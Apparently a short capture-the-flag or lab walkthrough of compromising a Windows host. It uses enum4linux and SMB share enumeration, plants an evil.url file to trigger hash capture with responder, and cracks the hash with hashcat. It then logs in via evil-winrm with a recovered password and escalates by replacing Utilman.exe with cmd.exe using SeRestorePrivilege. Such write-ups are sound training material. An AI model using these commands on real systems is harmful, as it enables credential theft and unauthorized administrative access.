
Os info using enum4linux:![](attachment/c9a69b7dacb4f849274eb4505b88b0de.png)
# 445

We discover smb shares:![](attachment/2ab49d50054e11d68c232c9a7a74cc02.png)
DocumentsShare seems interesting.

Now putting @evil.url in DocumentsShare:
![](attachment/16c661e04f7d0efe5c7f8e481d274012.png)
And running responder:
```
sudo responder -A -I tun0
```
We got a hash:
![](attachment/d9e69db36fcf0239c107320d66d0cd62.png)
We can crack this:
```
hashcat -m 5600 hashes.txt '/home/aditya/Documents/Kali/rockyou.txt' -O
```
![](attachment/0be6af67f1559c7dd0ed285a524d9e95.png)
We can connect through evil-winrm:
```
evil-winrm -i 192.168.182.172 -u anirudh -p SecureHM
```
![](attachment/9c44690a9f01b41db8106c50cdf5a810.png)

We have SeRestorePrivilege so we can access all files:
```
ren "C:/Windows/System32/Utilman.exe" Utilman.old
ren "C:/Windows/System32/cmd.exe" Utilman.exe
```
Now connect via rdesktop and do `win + u`
![](attachment/1df4186968cd1333970287bff8505781.png)\